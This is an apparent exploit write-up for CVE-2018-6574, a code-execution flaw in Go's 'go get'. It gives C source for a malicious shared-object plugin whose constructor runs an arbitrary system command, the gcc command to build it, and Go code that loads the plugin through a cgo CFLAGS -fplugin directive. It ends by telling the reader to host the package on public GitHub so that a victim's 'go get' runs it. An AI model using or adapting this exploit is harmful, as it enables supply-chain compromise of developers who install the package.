# CVE-2018-6574

Remote command execution in `Golang` go get command.

CVE-2018-6574 this vulnerability impacts Golang go get command and allows an attacker to gain code execution on a system installing his malicious library, this vulnerability was fixed in Go 1.8.7, 1.9.4 and 1.10rc2.

Golang will build native extensions. This can be used to pass additional flags to the compiler to gain code execution. For example, `CFLAGS` can be used.

## Exploitation:

You will need a malicious `exploit.so` file. The code below should help you with that:

```c
#include<stdio.h>
#include<stdlib.h>

static void exploit() __attribute__((constructor));

void exploit() {
    system("[YOUR CMD]");
}
```

You can build it using the following command:

```bash
gcc -shared -o exploit.so -fPIC exploit.c
```

Notice that you need to build that plugin on the same platform and architecture as the victim.

Then, you need the go code that will tell `cgo` to use your plugin:

```go
package main
// #cgo CFLAGS: -fplugin=./exploit.so
// typedef int (*intFunc) ();
// int _func(intFunc f)
// {
//      return f();
// }
// int one()
// {
//      return 1;
// }
import "C"
import "fmt"

func main() {
    f := C.intFunc(C.one)
    fmt.Println(int(C._func(f)));
}
```

Then you should host the malicious package (.so & main.go) in public Github repository.

The malicious package will executed after:

```go
go get github.com/XXXXX/XXXX
```

Run by the victim.
